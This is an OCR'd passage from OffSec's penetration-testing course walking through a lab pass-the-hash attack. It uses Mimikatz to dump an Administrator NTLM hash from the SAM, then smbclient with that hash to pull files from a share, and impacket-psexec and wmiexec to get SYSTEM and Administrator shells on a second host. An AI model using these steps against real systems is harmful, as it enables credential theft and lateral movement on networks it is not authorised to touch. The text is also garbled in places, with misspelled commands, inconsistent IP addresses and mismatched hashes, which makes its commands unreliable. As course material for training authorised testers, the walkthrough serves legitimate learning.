
# OffSec

If we don't use the local Administrator user in pass-hash, the target machine also needs to be configured in a certain way to obtain successful code execution. Since Windows Vista, Windows versions with UAC restrict enabled by default. This software prevents commands from running with administrative rights on remote systems. This effectively mitigates this attack vector for users in the local administrator group from the local account.

In this documentation, let's assume we've already gained access to FILES01 and the password (password123!) for the gunther user. We want to extract the Administrator's NTLM hash and use it to authenticate to a restricted SMB share and pass-the-hash to obtain an interactive shell on FILES02.

We'll assume the local administrator accounts on both machines, FILES01 and FILES02, have the same password. This is quite common and often found in real-life assessments.

We'll begin connecting to FILES01 (192.168.50.211) with RDP using a username of gunther and a password of password123!. We'll then start Windows Explorer and enter the path of the SMB share `\192.168.50.212\secrets` in the navigation bar. After entering the command, we are prompted for credentials to connect to the share.

![](img/336d6ea891e7464f18ad64426619ced4_415_0.png)

Figure 220: RDP Connection as nearly

When we enter our credentials for the gunther user, we are notified that Windows cannot access this share. This means that the user account does not exist on FILES02 or it doesn't have the necessary permissions to access the share.

Now, let's obtain the NTLM hash of Administrator with Mimikatz, as we did in the previous section. Again, we'll open a PowerShell window as where Mimikatz is located in `C:\tools` on FILES01.

> 660 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

Administrator and fire up Mimikatz. Next, we enter the commands privilege::debug, token::elevate, and l lump::sam to retrieve the stored NTLM hash from the SAM.

```
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
...
mimikatz # l lump::sam
RID : 000001f4 (500)
User : Administrator
Hash NTLM : 7a38310ea6f027ee955abed172964b4
```

Listing 296 - Enabling SeDebugPrivilege, retrieving SYSTEM user privileges and extracting NTLM hashes

Listing 296 displays the output of the NTLM hash extraction. We will use the Administrator NTLM hash for later.

To leverage pass-the-hash (PTH), we need tools that support authentication with NTLM hashes. For unfortunately, we have many to choose from. Let's review a few examples for different cases. For SMB enumeration and management, we can use smclient^61 or CrackMapExec^62. For command execution, we can use the scripts from thepacket^63 library like psexec.py64 and wmiex.py65 We can use NTLM hashes to not only connect to systems with SMB but also via other protocols like RDP and WinRM^66 if the user has the rights. We can also use Mimikatz to conduct pass-the-hash.

Since the first goal of this demonstration is to gain access to an SMB share by providing an NTLM hash, we will use smclient.

To use the command, we need to enter the path of the share as the first argument by escaping the backslashes. We will enter \\192.168.59.212\\secrets. We will use -U Administrator to set the user and -pw-nt-hash to indicate the hash.

After successfully connecting to the SMB share 'secrets' with smclient we can list all files in the SMB share with dir. We can use the get command to download files to our Kali machine.

```
kali@kali:# smclient \\192.168.59.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f027ee955abed172964b4
smb: \> dir
Try "help" to get a list of possible commands.
D 0 Thu Jun 2 16:55:37 2022
DHS 0 Thu Jun 2 16:55:35 2022
A 4 Thu Jun 2 11:34:47 2022
secrets.txt
```

+ 661 (Samba, 2022), https://www.samba.org/s/docs/man-html/smclient.1
662 (Github, 2022), https://github.com/by333dr/CrackMapExec
663 (Github, 2022), https://github.com/SecureAuthCorp/impacket
664 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
665 (Github, 2021), https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiex.py
666 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/32/winportal

# OffSec

45239 blocks of size 4096. 77163 blocks available
```
smb: \ get secrets.txt
getting file | secrets.txt of size 4 (0.0 KiloBytes/sec)
```

Listing 297 - Using smclient with NTLM hash

We successfully connected to the SMB share by providing NTLM hash instead of a password. The directory listing reveals secrets.txt. After downloading the file we can view its contents.

In the first part of this demonstration we used NTLM hash to gain access to a SMB share in the second part, our goal is to obtain an interactive shell. Again, we use a variety of different tools at our disposal but we will use the psexec.py script from the impacket library. The script is very similar to the original Sysinternals PsExec command. The desired result is to obtain an interactive shell or code execution.

To execute psexec, we use two arguments. The first argument is hashes, which allows us to use NTLM hash to authenticate to the target. The format is "LMHash:NTLMHash", in which we fill the LMHash section with 32. At the end of the command we could specify another argument, which is "username@ip", to determine which psexec executes on the target. If we leave it empty, cmd.exe will be executed, provisioning us an interactive shell.

```
kali@kali~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f027ee955abed172964b
Administrator@v0.0
```

* Requesting shares on 192.168.5.212...
* Found writable share ADMIN$
* Uploading file vnanel.exe
* Opening SVC on 192.168.5.212...
* Creating service HML on 192.168.5.212...
* Starting service HML...
* Press help for extra shell

Microsoft Windows [Version 10.0.20348.707]
(C) Microsoft Corporation. All rights reserved.

```
C:\Windows\system32> hostname
C:\Windows\system32> ipconfig
```

⁶667 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/internals/psexec
⁶68 (Kali Tools, 2022), https://www.kali.com/tools/impacket-scripts

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

Penetration Testing with Kali Linux

# Windows IP Configuration

Ethernet adapter Ethernet0:

| Connection-specific Suffix | : |
| Link-local IPv6 Address | fe80::7992:61cd:da49:9046 |
| IPv4 Address | 192.168.50.212 |
| Subnet Mask | 255.255.255.0 |
| Default Gateway | 192.168.50.254 |

```
C:\Windows\system32> whoami
authority\system
C:\Windows\system32> exit
```

```
kali@kali:-$
```

Listing 299 - Using psexec to get an interactive shell

We successfully obtained an interactive shell on FILES02. Due to the nature of psexec.py, we'll always receive a shell as SYSTEM instead of the user we used to authenticate.

We can use one of the other scripts like impacket-wmiexec to obtain a shell as the user we used for authentication. On Kali, we would use impacket-wmiexec with the arguments we used for impacket-psexec.

```
kali@kali:-$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea66f0027ee955abed1762964
Administrator@192.168.50.212
```

Impacket v0.94 - Copyright 2021 SecureAuth Corporation

+ [* SMB3.18 dialect used
[1] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

```
C:\whoami
files02>administrator
```

```
C:\>
```

Listing 299 - Using wmiexec to get an interactive shell

The whoami output shows, we obtained a shell as the Administrator user using wmiexec instead of SYSTEM.

In this section, we used pass-hash to gain access to an SMB share. We then used the hash to obtain an interactive shell with impacket-psexec and impacket-wmiexec.

# 13.3.3 Cracking Net-NTLMv2

In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user. This means we cannot use tools Mimikatz to extract passwords or NTLM hashes. In situations like these, we can abuse the Net-NTLMv2 network authentication protocol. This protocol is responsible for managing the authentication process for Windows clients and servers over network.
